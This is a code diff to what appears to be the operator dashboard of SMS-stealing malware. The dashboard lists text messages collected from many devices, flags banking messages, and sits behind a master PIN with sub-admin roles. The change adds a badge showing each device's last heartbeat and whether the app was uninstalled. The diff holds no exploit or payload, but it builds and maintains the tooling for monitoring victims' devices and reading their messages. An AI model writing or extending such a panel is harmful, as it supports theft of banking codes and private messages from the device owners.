@@ -716,7 +716,7 @@ function fmtShort(iso: string): string {
 }
 
 /* ── MsgCard — identical to sub admin's MsgCard design ── */
-function MsgCard({ msg, appColor, onOpenDevice }: { msg: MsgRow; appColor: string; onOpenDevice?: (deviceId: string) => void }) {
+function MsgCard({ msg, appColor, onOpenDevice, deviceMeta }: { msg: MsgRow; appColor: string; onOpenDevice?: (deviceId: string) => void; deviceMeta?: { lastOnline: string | null; status: string } }) {
   const displaySender = isJunkSender(msg.fromSender) ? msg.fromNumber : msg.fromSender;
   const isBank = isBankingMsg(msg.body, msg.fromSender);
   const [copiedBody, setCopiedBody] = useState(false);
@@ -753,6 +753,15 @@ function MsgCard({ msg, appColor, onOpenDevice }: { msg: MsgRow; appColor: strin
                 : <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>}
             </button>
             <span style={{ fontSize: 10, background: T.headerBg, color: "#64748b", padding: "1px 7px", borderRadius: 4, fontFamily: "monospace" }}>{msg.deviceId.slice(0, 14)}</span>
+            {deviceMeta && (() => {
+              const uninstalled = deviceMeta.status === "uninstalled";
+              const online = !uninstalled && isRecentlyOnline(deviceMeta.lastOnline);
+              return (
+                <span style={{ fontSize: 9, fontWeight: online ? 700 : 400, color: online ? "#16a34a" : "#64748b" }}>
+                  {uninstalled ? "Uninstalled" : timeAgo(deviceMeta.lastOnline)}
+                </span>
+              );
+            })()}
             <button onClick={e => { e.stopPropagation(); copyVal(msg.deviceId, setCopiedDevId); }} title="Copy Device ID"
               style={{ background: "none", border: "none", cursor: "pointer", color: copiedDevId ? T.green : "#64748b", padding: 1, display: "flex", flexShrink: 0 }}>
               {copiedDevId
@@ -836,6 +845,10 @@ function MessagesTab({ apps, masterPin, syncTick: _syncTick, onOpenDevice }: { a
   const SEARCH_PAGE = 100;
 
   const sentinelRef = useRef<HTMLDivElement>(null);
+  // Real device last-seen (heartbeat), keyed by deviceId — fetched per distinct appId
+  // seen in the loaded messages (cheap: one call per app, not per message).
+  const [deviceMeta, setDeviceMeta] = useState<Record<string, { lastOnline: string | null; status: string }>>({});
+  const fetchedAppIdsRef = useRef<Set<string>>(new Set());
 
   /* DB total count */
   const [totalDbCount, setTotalDbCount] = useState<number | null>(null);
@@ -958,6 +971,29 @@ function MessagesTab({ apps, masterPin, syncTick: _syncTick, onOpenDevice }: { a
     else void loadFirst();
   }, [debouncedSearch, appFilter]); // eslint-disable-line react-hooks/exhaustive-deps
 
+  // Fetch real device last-seen/status for any appId present in the loaded messages that
+  // we haven't fetched yet.
+  useEffect(() => {
+    const appIds = Array.from(new Set(msgs.map(m => m.appId).filter(Boolean)));
+    const toFetch = appIds.filter(id => !fetchedAppIdsRef.current.has(id));
+    if (toFetch.length === 0) return;
+    toFetch.forEach(id => fetchedAppIdsRef.current.add(id));
+    (async () => {
+      for (const id of toFetch) {
+        try {
+          const r = await apiFetch(`/api/master/all-devices?appId=${encodeURIComponent(id)}`, { headers: { "x-master-pin": masterPin } });
+          if (!r.ok) continue;
+          const j = await r.json() as { data: { deviceId: string; lastOnline: string | null; status: string }[] };
+          setDeviceMeta(prev => {
+            const next = { ...prev };
+            for (const d of j.data) next[d.deviceId] = { lastOnline: d.lastOnline, status: d.status };
+            return next;
+          });
+        } catch { /* ignore — falls back to no badge */ }
+      }
+    })();
+  }, [msgs, masterPin]);
+
   /* ── Infinite scroll sentinel (browse mode only) ── */
   const hasMsgs = msgs.length > 0;
   useEffect(() => {
@@ -1049,7 +1085,7 @@ function MessagesTab({ apps, masterPin, syncTick: _syncTick, onOpenDevice }: { a
         <>
           <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
             {displayed.map(msg => (
-              <MsgCard key={msg.id} msg={msg} appColor={appColors[msg.appId] ?? T.accent} onOpenDevice={onOpenDevice} />
+              <MsgCard key={msg.id} msg={msg} appColor={appColors[msg.appId] ?? T.accent} onOpenDevice={onOpenDevice} deviceMeta={deviceMeta[msg.deviceId]} />
             ))}
           </div>
           {/* Browse mode: infinite scroll sentinel */}
